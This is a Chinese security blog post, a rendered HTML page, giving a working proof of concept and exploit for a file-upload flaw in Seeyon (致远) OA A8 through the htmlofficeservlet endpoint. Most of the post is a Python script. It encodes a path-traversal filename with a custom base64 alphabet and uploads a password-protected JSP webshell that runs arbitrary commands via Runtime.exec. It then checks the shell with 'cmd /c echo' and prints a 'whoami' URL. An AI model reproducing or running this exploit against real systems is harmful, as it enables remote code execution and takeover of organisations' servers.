<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="致远 OA-A8 系统的 Servlet 接口存在漏洞，可通过 /seeyon/htmlofficeservlet 直接getsehll"/>
  <meta name="author" content="Reber"/>
  
    
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</h1>
      
<div class="post-meta">
    <time>2019-06-29</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>)
</div>

      <div><h3 id="0x00-影响版本">0x00 影响版本</h3>
<ul>
<li>致远A8-V5协同管理软件 V6.1sp1</li>
<li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
<li>致远A8+协同管理软件 V7.1</li>
</ul>
<h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞</h3>
<p>如果查看 <code>&quot;seeyon/htmlofficeservlet&quot;</code> 接口，出现如下内容则表示存在漏洞
<img src="/img/post/Xnip2019-06-29_09-43-32.png" alt="70"></p>
<h3 id="0x02-poc--exp">0x02 POC &amp; EXP</h3>
<pre tabindex="0"><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import random
import string
import requests

info = {
    &#34;name&#34;: &#34;致远 A8 可 getshell&#34;,
    &#34;author&#34;: &#34;reber&#34;,
    &#34;version&#34;: &#34;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&#34;,
    &#34;type&#34;: &#34;file_upload&#34;,
    &#34;level&#34;: &#34;high&#34;,
    &#34;result&#34;: &#34;&#34;,
    &#34;status&#34;: False,
    &#34;references&#34;: &#34;&lt;url&gt;&#34;,
    &#34;desc&#34;: &#34;&lt;vul describtion&gt;&#34;,
}

def assign(service, arg):
   if service == &#39;seeyon&#39;:
       return True, arg

def encode(origin_bytes):
    &#34;&#34;&#34;
    重构 base64 编码函数
    &#34;&#34;&#34;
    # 将每一位bytes转换为二进制字符串
    base64_charset = &#34;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&#34;
    base64_bytes = [&#39;{:0&gt;8}&#39;.format(bin(ord(b)).replace(&#39;0b&#39;, &#39;&#39;)) for b in origin_bytes]

    resp = &#39;&#39;
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = &#39;&#39;.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += &#39;&#39;.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = &#39;&#39;.join(base64_bytes[3 * nums:]) + (3 - remain) * &#39;0&#39; * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += &#39;&#39;.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * &#39;=&#39;

    return resp

def verify(arg):
    url = arg + &#34;/seeyon/htmlofficeservlet&#34;
    tmp_random_str = &#39;&#39;.join(random.sample(string.letters+string.digits, 10))
    headers = {
        &#34;Pragma&#34;: &#34;no-cache&#34;,
        &#34;Cache-Control&#34;: &#34;no-cache&#34;,
        &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;,
        &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;,
        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
        &#34;Connection&#34;: &#34;close&#34;,
        &#34;Content-Length&#34;: &#34;429&#34;,
    }
    file_name = encode(&#39;..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt&#39;)
    payload = &#34;DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n&#34;
    payload += &#34;OPTION=S3WYOSWLBSGr\r\n&#34;
    payload += &#34;currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n&#34;
    payload += &#34;CREATEDATE=wUghPB3szB3Xwg66\r\n&#34;
    payload += &#34;RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n&#34;
    payload += &#34;originalFileId=wV66\r\n&#34;
    payload += &#34;originalCreateDate=wUghPB3szB3Xwg66\r\n&#34;
    payload += &#34;FILENAME={}\r\n&#34;.format(file_name)
    payload += &#34;needReadFile=yRWZdAS6\r\n&#34;
    payload += &#34;originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n&#34;
    payload += &#34;a{}&#34;.format(tmp_random_str)

    try:
        requests.post(url=url, data=payload, headers=headers)
        
        upfile_url = arg+&#34;/seeyon/shXi3GAEuT.txt&#34;
        time.sleep(2)
        resp = requests.get(url=upfile_url)
        code = resp.status_code
        content = resp.text
    except Exception as e:
        # print str(e)
        pass
    else:
        if code==200 and tmp_random_str[1:] in content:
            info[&#39;status&#39;] = True
            info[&#39;result&#39;] = &#34;{} 可直接getshell, 测试文件路径: {}&#34;.format(arg,upfile_url)

def attack(arg):
    url = arg + &#34;/seeyon/htmlofficeservlet&#34;
    headers = {
        &#34;Pragma&#34;: &#34;no-cache&#34;,
        &#34;Cache-Control&#34;: &#34;no-cache&#34;,
        &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;,
        &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;,
        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
        &#34;Connection&#34;: &#34;close&#34;,
        &#34;Content-Length&#34;: &#34;429&#34;,
    }
    file_name = encode(&#39;..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp&#39;)
    payload = &#34;&#34;&#34;DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=&#34;&#34;&#34;+file_name+&#34;&#34;&#34;\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
&lt;%@ page language=&#34;java&#34; import=&#34;java.util.*,java.io.*&#34; pageEncoding=&#34;UTF-8&#34;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&#34;\\n&#34;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&#34;el38A9485&#34;.equals(request.getParameter(&#34;pwd&#34;))&amp;&amp;!&#34;&#34;.equals(request.getParameter(&#34;cmd&#34;))){out.println(&#34;&lt;pre&gt;&#34;+excuteCmd(request.getParameter(&#34;cmd&#34;)) + &#34;&lt;/pre&gt;&#34;);}else{out.println(&#34;:-)&#34;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce&#34;&#34;&#34;

    requests.post(url=url, data=payload, headers=headers)
    resp = requests.get(arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre&#39;)
    if &#39;ekwjkjrwre&#39; in resp.text:
        print &#34;{} 的 webshell 路径: {}&#34;.format(arg,arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami&#39;)
</code></pre><h3 id="0x03-执行得到结果">0x03 执行得到结果</h3>
<!-- raw HTML omitted -->
<p><img src="/img/post/Xnip2019-06-29_09-57-11.png" alt="80"></p>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2023
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
